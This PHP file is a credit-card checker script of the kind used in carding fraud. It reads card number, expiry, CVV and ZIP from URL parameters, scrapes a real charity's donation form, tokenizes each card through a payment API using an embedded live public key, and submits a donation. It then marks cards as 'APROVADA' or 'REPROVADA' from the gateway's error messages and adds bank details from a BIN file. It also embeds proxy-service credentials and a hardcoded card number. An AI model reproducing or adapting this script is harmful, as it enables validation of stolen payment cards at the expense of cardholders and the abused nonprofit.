<?php
set_time_limit(0);
error_reporting(0);
    

   function value($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
    }
function getstr($string, $start, $end, $offset = 1) {
    $str = explode($start, $string);
    $str = explode($end, $str[$offset]);
    return $str[0];
}
    if($_GET['testar']=="cc"){
        $ccs    = $_GET['ccs'];
        $separador  = $_GET['separador'];
        $id     = $_GET['id'];
        $explode = explode($separador,$ccs);
        if($explode[0][0]=='4'){
            $bander = '2';
        }elseif($explode[0][0]=='5'){
            $bander = '1';
        }
        elseif($explode[0][0]=='37'){
            $bander = '3';
        }   
       

        $numero = $explode[0];
        $mes = $explode[1];
        $ano = $explode[2];
        $cvv = $explode[3];
        $cep = $explode[4];


   $ch = curl_init();

$username = 'lum-customer-hl_5056b531-zone-static';
$password = 'wtkmwp7fan9w';
$port = 22225;
$user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko';
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
$random = mt_rand();
$random_cvv = mt_rand(111,999);
	
	
	
	
	
	     curl_setopt($ch, CURLOPT_URL,"https://ohiofreeclinics.org/get-involved/donate.html");
    $headr = array();
    $headr[] = 'Host: ohiofreeclinics.org';
    $headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko';
    $headr[] = 'Accept: */*';
    $headr[] = 'X-Requested-With: XMLHttpRequest';
    $headr[] = 'Referer: https://ohiofreeclinics.org/get-involved/donate.html';
    //curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
    //curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-dns-local-session-$session:$password");
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,false);
    $curl = curl_exec($ch); // Resultado
    $form_postid =  value($curl, '<input type="hidden" name="form_post_id" value="','"');
	$form_fraud_prevention =  value($curl, 'form_fraud_prevention?token=','"');
	$content_form_id =  value($curl, '<input type="hidden" name="content_form_id" value="','"');
	
	
	
		     curl_setopt($ch, CURLOPT_URL,"https://api.paymentspring.com/api/v1/tokens/jsonp?callback=jsonpcallback&token_type=credit_card&public_api_key=live_240533007a7feea1dca2dd6d9e5e2d440fd6033a6cd3f3d8a687f5d0b7&card_number=5522896556071503&card_exp_month=5&card_exp_year=2020&card_owner_name=sdfv%20sfdfsd&zip=10001&_=1550444086985");
    $headr = array();
    $headr[] = 'Host: api.paymentspring.com';
    $headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko';
    $headr[] = 'Accept: */*';
    $headr[] = 'Referer: https://ohiofreeclinics.org/get-involved/donate.html';
    $headr[] = 'Connection: keep-alive';
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
    //curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-dns-local-session-$session:$password");
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,false);
    //curl_setopt($ch, CURLOPT_POSTFIELDS,'{"payment_tokens":["35czbpy4yvish3cbtipdwhcds"],"instrument_type":"DEBIT_CARD","request_context":{"transfer_token":null},"card":{"id":"ephem_396713560799337","unencrypted_pan":"'.$numero.'","expiration":"'.$ano.''.$mes.'","security_code":"'.$random_cvv.'","postal_code":"90064"}}');
    $curl = curl_exec($ch); // Resultado
    $paymentidtrans =  value($curl, 'id":"','"');
	
	


	
	curl_setopt($ch, CURLOPT_URL,"https://ohiofreeclinics.org/ajax/form_fraud_prevention?token='.$form_fraud_prevention.'&form_post_id='.$form_postid.'");
    $headr = array();
    $headr[] = 'Host: ohiofreeclinics.org';
	$headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0';
	$headr[] = 'X-Requested-With: XMLHttpRequest';
	$headr[] = 'Referer: Referer';
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
    //curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-dns-local-session-$session:$password");
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,false);
    //curl_setopt($ch, CURLOPT_POSTFIELDS,'{"payment_tokens":["35czbpy4yvish3cbtipdwhcds"],"instrument_type":"DEBIT_CARD","request_context":{"transfer_token":null},"card":{"id":"ephem_396713560799337","unencrypted_pan":"'.$numero.'","expiration":"'.$ano.''.$mes.'","security_code":"'.$random_cvv.'","postal_code":"90064"}}');
    $curl = curl_exec($ch); // Resultado
    //$geterr =  value($curl, '"failure_message":"','"');
	$formtransaction = getStr($curl, '":"','"',2);
	
	
	
	
		curl_setopt($ch, CURLOPT_URL,"https://ohiofreeclinics.org/get-involved/donate.html");
    $headr = array();
    $headr[] = 'Host: ohiofreeclinics.org';
	$headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0';
	$headr[] = 'Accept: */*';
	$headr[] = 'X-Requested-With: XMLHttpRequest';
	$headr[] = 'Referer: https://ohiofreeclinics.org/get-involved/donate.html';
    //curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
    //curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-dns-local-session-$session:$password");
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,'form_post_id='.$form_postid.'&content_form_id='.$content_form_id.'&f23053478_s323040=0&f23053479_s399730=10&f04635916=&f23053480=sacdasdc&f23053481=asdcasdc&f23053482=ascdas4343%40djhbc.com&f23053483=1&f23053484_payment_method=cc&f23053484_CREDIT_CARD_EXPIRATION_DATE=05+%2F+20&payment_gateway_cc_token='.$paymentidtrans.'&content_828bd8dba1aae6854262e59c8eca1830_f23053484_CREDIT_CARD_NUMBER=7474&content_828bd8dba1aae6854262e59c8eca1830_f23053484_CREDIT_CARD_HOLDER_NAME=sdfv+sfdfsd&content_828bd8dba1aae6854262e59c8eca1830_f23053484_CREDIT_CARD_EXPIRATION_DATE_MONTH=5&content_828bd8dba1aae6854262e59c8eca1830_f23053484_CREDIT_CARD_EXPIRATION_DATE_YEAR=2020&content_828bd8dba1aae6854262e59c8eca1830_f23053484_CREDIT_CARD_ZIP_CODE=undefined&form_fraud_id='.$formtransaction.'');
    $curl = curl_exec($ch); // Resultado
    //$geterr =  value($curl, '"failure_message":"','"');
	//$formtransaction = getStr($curl, '":"','"',2);
	
	
	
	
	
	
	



	echo $curl;



        if(strpos($curl, "Invalid ZIP Code")!==false){ 


        $bin = substr($numero, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
    $encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $teste = $pieces[3];
        $teste1 = $pieces[7];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
} else {
    $pais = $pieces[5];
    $paiscode = $pieces[6];
    $teste = $pieces[3];
    $teste1 = $pieces[7];
    $level = $pieces[4];
    $banco = $pieces[2];
    $bandeira = $pieces[1];
}



            echo"<center><span style='text-shadow: 0 0 7px green; color: green;'> APROVADA </span>$numero|$mes|$ano|$cvv Info: '.$bandeira.' '.$banco.' '.$teste.' '.$level.'('.$pais.') </center> Res: $geterr";
        }
        elseif(strpos($curl, "Invalid Transaction")!==false){ 


        $bin = substr($numero, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
    $encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $teste = $pieces[3];
        $teste1 = $pieces[7];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
} else {
    $pais = $pieces[5];
    $paiscode = $pieces[6];
    $teste = $pieces[3];
    $teste1 = $pieces[7];
    $level = $pieces[4];
    $banco = $pieces[2];
    $bandeira = $pieces[1];
}



            echo"<center><span style='text-shadow: 0 0 7px green; color: green;'> APROVADA </span>$numero|$mes|$ano|$cvv Info: '.$bandeira.' '.$banco.' '.$teste.' '.$level.'('.$pais.') </center> Res: $geterr";
        }
        elseif(strpos($curl, "Declined CVV")!==false){ 


        $bin = substr($numero, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
    $encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $teste = $pieces[3];
        $teste1 = $pieces[7];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
} else {
    $pais = $pieces[5];
    $paiscode = $pieces[6];
    $teste = $pieces[3];
    $teste1 = $pieces[7];
    $level = $pieces[4];
    $banco = $pieces[2];
    $bandeira = $pieces[1];
}



            echo"<center><span style='text-shadow: 0 0 7px green; color: green;'> APROVADA </span>$numero|$mes|$ano|$cvv Info: '.$bandeira.' '.$banco.' '.$teste.' '.$level.'('.$pais.') </center> Res: $geterr";
        }
        elseif(strpos($curl, "There was an error with your credit card. Declinedc")!==false){ 


        $bin = substr($numero, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
    $encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $teste = $pieces[3];
        $teste1 = $pieces[7];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
} else {
    $pais = $pieces[5];
    $paiscode = $pieces[6];
    $teste = $pieces[3];
    $teste1 = $pieces[7];
    $level = $pieces[4];
    $banco = $pieces[2];
    $bandeira = $pieces[1];
}



            echo"<center><span style='text-shadow: 0 0 7px green; color: green;'> APROVADA </span>$numero|$mes|$ano|$cvv Info: '.$bandeira.' '.$banco.' '.$teste.' '.$level.'('.$pais.') </center>";
        }else{ 
        echo"<center><span style='text-shadow: 0 0 7px red; color: red;'> REPROVADA </span>  $numero|$mes|$ano|$cvv  Res: $geterr </font></center>";
             
        }
    }
?>
